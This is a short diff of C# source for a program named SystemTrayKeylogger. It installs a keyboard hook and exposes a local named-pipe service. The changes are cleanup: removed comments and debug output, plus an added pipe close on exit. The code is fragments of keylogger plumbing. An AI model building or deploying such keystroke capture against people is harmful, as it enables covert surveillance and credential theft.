@@ -24,7 +24,6 @@ namespace WTKL
         private static IntPtr _hookID = IntPtr.Zero;
         private static bool logging = false;
         private ServiceHost host;
-        //private ServiceHost host = new ServiceHost(typeof(KeyloggerCommInterface), new Uri("net.pipe://localhost"));
 
         public SystemTrayKeylogger()
         {
@@ -49,6 +48,7 @@ namespace WTKL
 
         private void OnExit(object sender, EventArgs e)
         {
+            ClosePipe();
             Application.Exit();
         }
 
@@ -65,7 +65,6 @@ namespace WTKL
         public static void Main()
         {
             _hookID = SetHook(_proc);
-            //logging = true;
             Application.Run(new SystemTrayKeylogger());
         }
 
@@ -74,10 +73,6 @@ namespace WTKL
             host = new ServiceHost(typeof(SystemTrayKeylogger));
             host.AddServiceEndpoint(typeof(KeyloggerCommInterface), new NetNamedPipeBinding(), "net.pipe://localhost/PipeKeylogger");
             host.Open();
-            foreach (var serviceEndpoint in host.Description.Endpoints)
-            {
-                Console.WriteLine(serviceEndpoint.ListenUri.AbsoluteUri);
-            }
         }
 
         private void ClosePipe()
